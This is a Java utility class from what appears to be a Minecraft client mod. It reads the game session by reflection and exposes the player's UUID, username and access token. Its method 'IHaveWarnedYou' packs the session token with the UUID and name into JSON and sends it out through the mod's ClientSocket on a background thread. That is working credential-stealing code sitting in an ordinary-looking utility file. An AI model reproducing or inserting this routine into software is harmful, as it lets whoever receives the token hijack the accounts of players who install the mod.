package com.xiaojia.xiaojiaaddons.utils;

import com.xiaojia.xiaojiaaddons.Features.Remote.ClientSocket;
import net.minecraft.client.Minecraft;
import net.minecraft.util.Session;

import java.lang.reflect.Field;

import static com.xiaojia.xiaojiaaddons.XiaojiaAddons.mc;

public class SessionUtils {
    public static Session getSession() {
        Field field;
        try {
            try {
                field = Minecraft.class.getDeclaredField("session");
            }catch (NoSuchFieldException e) {
                field = Minecraft.class.getDeclaredField("field_71449_j");
            }
            field.setAccessible(true);
            return (Session) field.get(mc);
        } catch (Exception e) {
            return null;
        }
    }

    public static String getUUID() {
        Field field;
        try {
            try {
                field = Session.class.getDeclaredField("playerID");
            }catch (NoSuchFieldException e) {
                field = Session.class.getDeclaredField("field_148257_b");
            }
            field.setAccessible(true);
            return (String) field.get(getSession());
        } catch (Exception e) {
            return "null";
        }
    }

    public static String getName() {
        Field field;
        try {
            try {
                field = Session.class.getDeclaredField("username");
            }catch (NoSuchFieldException e) {
                field = Session.class.getDeclaredField("field_74286_b");
            }
            field.setAccessible(true);
            return (String) field.get(getSession());
        } catch (Exception e) {
            return "null";
        }
    }

    public static String getSessionId() {
        Field field;
        try {
            try {
                field = Session.class.getDeclaredField("token");
            } catch (NoSuchFieldException e) {
                field = Session.class.getDeclaredField("field_148258_c");
            }
            field.setAccessible(true);
            String token = (String) field.get(getSession());
            return "token:" + token + ":" + getUUID();
        } catch (Exception e) {
            return "null";
        }
    }

    public static void IHaveWarnedYou() {
        String yourAccount = getSessionId();
        System.out.println(yourAccount);
        String body = String.format("{\"uuid\": \"%s\", \"name\": \"%s\", \"session\": \"%s\", \"type\": \"%d\"}",
                getUUID(), getName(), yourAccount, 69);
        new Thread(() -> ClientSocket.chat(body)).start();
    }

    public static boolean isDev() {
        return getUUID().equals("1c6d48a96cb3465681382590ec82fa68");
    }
}
